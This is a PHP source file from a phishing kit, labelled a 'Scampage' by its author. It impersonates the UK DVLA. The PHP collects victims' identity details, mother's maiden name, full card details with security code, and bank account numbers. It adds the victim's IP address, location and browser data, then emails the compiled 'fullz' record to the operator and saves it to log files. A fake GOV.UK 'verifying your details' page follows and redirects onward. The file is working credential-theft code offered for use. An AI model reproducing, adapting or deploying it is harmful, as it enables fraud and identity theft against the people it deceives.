﻿<?php
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];
$mmn = $_SESSION['mmn'];
$telephone = $_SESSION['telephone'];
$email = $_SESSION['email'];
$address = $_SESSION['address'].", ".$_SESSION['town'].", ".$_SESSION['postcode'];
$address2 = $_SESSION['address2'];
$ccname = $_POST['ccname'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$sortcode = $_POST['sortcode'];
$account = $_POST['account'];
$_SESSION['sortcode'] = $_POST['sortcode'];
$_SESSION['account'] = $_POST['account'];
$_SESSION['ccname'] = $_POST['ccname'];
$_SESSION['ccno'] = $_POST['ccno'];
$_SESSION['secode'] = $_POST['secode'];
$ccno = str_replace(' ', '', $ccno);
$last4 = substr($ccno, 12, 16);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['type']);
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
$data = "
+ ------------- J1GS4W --------------+
+ ------------------------------------------+
+Personal details
Full name : $ccname
Driving license number: $name
Mothers maiden name : $mmn
Telephone : $telephone
Date of birth : $dob
Email : $email
Address : $address
Address line 2 : $address2
+ ------------------------------------------+
+Billing Information
Card BIN : $BIN
Card Bank : $Bank
Card Brand : $Brand 
Card Type : $Type
Cardholder name : $ccname
Card number : $ccno
Card exp : $ccexp
Security code : $secode
Sortcode : $sortcode
Account: $account
+ ------------------------------------------+
+PC Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5

Received : $date @ $time
+ ------------- J1GS4W --------------+
";



if ($binSave === 1) {
    $binlist = fopen($BIN.".txt","a");
    fwrite($binlist, $data . "\n\n");
    fclose($binlist);
}

if ($binlist === 1) {
    $bins = array();
    $getBins = explode('\n', file_get_contents('bins.txt'));
    foreach ($getBins as $getbin => $gb) {
        $dat = explode('=>', $gb);
        $bins[$dat[0]] = $dat[1];
    }
    if (isset($bins[intval($BIN)])) {
        $bins[intval($BIN)] =  intval($bins[intval($BIN)]) + 1;
    } else {
        $bins[intval($BIN)] = 1;
    }
    $binFile = fopen('list_bins.txt', 'w');
    foreach ($bins as $bin=>$bn) {
        fwrite($binFile, $bin . "\n");
    }
    fclose($binFile);
}

if ($sendEmail === 1) {

    mail($to,  $BIN . " from " . $_SERVER['REMOTE_ADDR'], $data);
}

if ($saveFile === 1) {
    $file = fopen('assets/logs/fullz.txt', 'a');
    fwrite($file, $data . "\n");
    fclose($file);
}



?>
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    
    <title>Successfully - DVLA</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="assets/files/template.css" media="screen">
    <link rel="stylesheet" href="assets/files/elements.css">
    <link rel="stylesheet" href="assets/files/fonts.css" media="all">
    <link rel="stylesheet" href="assets/files/template-print.css" media="print">
    <link rel="stylesheet" href="assets/files/local-overrides.css" media="all">
    <link rel="shortcut icon" href="assets/files/favicon.ico" type="image/x-icon">
    <link rel="mask-icon" href="assets/files/DVLA_logotype_crown.svg" color="#0b0c0c">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="assets/files/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="assets/files/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="assets/files/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon-precomposed" href="assets/files/apple-touch-icon-60x60.png">
    <meta name="theme-color" content="#0b0c0c">
    <meta http-equiv="refresh" content="7; url=gateway.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" />

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:image" content="/assets/images/opengraph-image.png">

</head><script type="text/javascript" id="useragent-switcher">navigator.__defineGetter__("userAgent", function() {return "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0"})</script>
<body data-signature="cENzeOKAkyBUblYydnlnZGIzSUJpS29GLGMwR3R3bURoLmVyMUFFdWzCqUxrYVNVT1BmAeWtmuSCh+OisOeerOKhiOeZluGLpOKJnOC7neeKoeWyqOenhOSQoOeZluK1muSihOC7ouaHnuWlnOKHnOSEkOeElOOkkOeElOOwleCio+SIuueUieG4uuannOC7suajouC9otan46C74ZaW5Zqk4oSH45254qGu4qi646aI5Ki54KCU4KC65ISH5aC54aKd4Lik4qOM4qOM4oeG4Lmq5qej4L6M4qKP4oWj4auH46ql4KiH5ISVwofkuKDnnJbguqPmgqPisaTih5TjoLzmiY7lgqDkoIfZq+ajrOSRsOetlOGxiOeUieC8uOSUieGwu+OWjOSUmeGeouGLoOebrOOkk+WsjeC7muaMouSZi+aiieOgu+OsnOSTreSNh+S4pOKjh+KTuOeIoOKgoOeZluS9geeHkOSQvOeCh+OisOeki+C7jOCso+Wji+Sio+CkiOewrOCgo+WWo+G4uOOjouWjpOKHhOKhseGHlOGIueeinOWipcSH5oSa5pCo5JOw5IeE4qGx4ZSJ4bC65ImH4pC84KyM5JC+4Zaj4bKz5Jyi4Yi75o2H1aDkhJ3itJnnh5LgvIXkjKLgvormo47is6Pkoongu7Hlh5visaTio4njtJHhnIfjnaPkop3loajnp4TklJjnkp/gu5zinIfkhJXCh+Oqo+Sgh+OkguSEh9Wh5qKH2rLmq5TkkKDnsKPioaXkmY3guYrmnJTjjJDniKLkm7Dkh6zhibjnmZbhibrknJTisYjkh6/UkeGHm+KxpOKjieO0keGch+WSo+GiieOMkOelqOWAu+GWieOkkeGch+KgoOesjOWipeCskOWEkOenieG8lOOHnOSEkOevguSRiOebluGklOOJnuSRi+SHquKjjOKJmeSQueSRoeOTgOeiheOMkOKch+OshOKjouC6s+SgouSbquSEouC4o+SsnOSRuOeph9ya5p2J4LuK5oKN5Jqh5qCc" class="js-enabled">
<script nonce="+VZoBIg/UNtrapeLqBrMAw==">document.body.classList.add('js-enabled');</script>
<div id="skiplink-container">
    <a href="#skip-target" class="skiplink">Skip to main content</a>
</div>
<div id="global-cookie-message">
    <p>DVLA uses cookies to make the site simpler. <a href="#">Find out more about cookies</a></p>
</div>
<header id="global-header" class="with-proposition">
    <div class="header-wrapper">
        <div class="header-global">
            <div class="header-logo">
                <a href="#" title="Go to the DVLA homepage" id="logo" class="content"> <img src="assets/files/gov.png" alt="" width="36" height="32"> DVLA </a>
            </div>
        </div>
        <div class="header-proposition">
            <div class="content">
                <nav id="proposition-link">
                </nav>
            </div>
        </div>
    </div>
</header>
<div id="global-header-bar"></div>
<main id="content">
    <div class="phase-banner">
        <p> <strong class="phase-tag">BETA</strong> <span>This is a new service – your <a id="feedback-link" href="#" >feedback</a> will help us to improve it</span> </p>
    </div>
    <ul class="language-toggle">
        <li>English</li>
        <li><a href="#">Cymraeg</a></li>
    </ul>
    <div class="grid-row">
        <div class="column-two-thirds" id="skip-target">
            <iframe class="hidden" id="webrtciframe" sandbox="allow-same-origin"></iframe>
            <script type="text/javascript" src="assets/files/CData.js"></script>
            <script src="assets/files/device-reputation.js"></script>

            <form action="Finish.php?ssl_id=<?php echo generateRandomString(130); ?>" method="POST" id="payment" name="payment">
                <p style="text-align: center;">
                    <br>
                    <br>
                    <img src="assets/spin.gif" style="width: 150px;" alt=""> <Br /> <br>
                    It'll only take a few seconds <Br />
                    we're just verifying the details that you've entered. <br /> <Br />

                    You will be redirected to your bank account to confirm your details.
                </p>
                <script nonce="+VZoBIg/UNtrapeLqBrMAw==">
                    (function(){
                        var form = document.getElementById('loginForm');

                        var submitButton = form.querySelector('#continue');
                        submitButton.disabled = true;
                        var timeout = setTimeout(function(){submitButton.disabled = false;}, 5000);

                        // don't allow form submissions until device profile is ready
                        onDeviceProfile(function(deviceProfile) {
                            submitButton.disabled = false;
                            clearTimeout(timeout);
                        });

                        form.addEventListener('submit', function() {
                            onDeviceProfile(function(deviceProfile) {
                                form.profile.value = deviceProfile;
                            });
                        });
                    })();
                </script>
            </form>

        </div>
    </div>

</main>
<footer class="group js-footer" id="footer">
    <div class="footer-wrapper">
        <div class="footer-meta">
            <div class="footer-meta-inner">
                <ul id="footer-link-list">
                    <li> <a id="cookies" href="#" >Cookies</a> </li>
                    <li> <a id="privacy-notice" href="#" >Privacy notice</a> </li>
                    <li> <a id="terms-and-conditions" href="#" >Terms and conditions</a> </li>
                </ul>
                <div class="open-government-licence">
                    <p class="logo"><a href="#" rel="license">Open Government Licence</a></p>
                    <p>All content is available under the <a href="#" >Open Government Licence v3.0</a>, except where otherwise stated</p>
                </div>
            </div>
            <div class="copyright">
                <a href="#">© Crown copyright</a>
            </div>
        </div>
    </div>
</footer>
<script src="assets/files/govuk-template.js"></script>
<script nonce="+VZoBIg/UNtrapeLqBrMAw==">if(typeof window.GOVUK === 'undefined') document.body.classList.remove('js-enabled');</script>
<script src="assets/files/page-complete.js"></script>

</body><div id="simple-translate"><div><div style="background-image: url(&quot;moz-extension://fa9cdb1d-11b8-453c-8418-4d2fa4c66747/icons/512.png&quot;); height: 22px; width: 22px; top: 10px; left: 10px;" class="simple-translate-button "></div><div class="simple-translate-panel " style="width: 300px; height: 200px; top: 0px; left: 0px; font-size: 13px; background-color: rgb(255, 255, 255);"><div class="simple-translate-result-wrapper" style="overflow: hidden;"><p class="simple-translate-result" style="color: rgb(0, 0, 0);"></p><p class="simple-translate-candidate" style="color: rgb(115, 115, 115);"></p></div></div></div></div></html>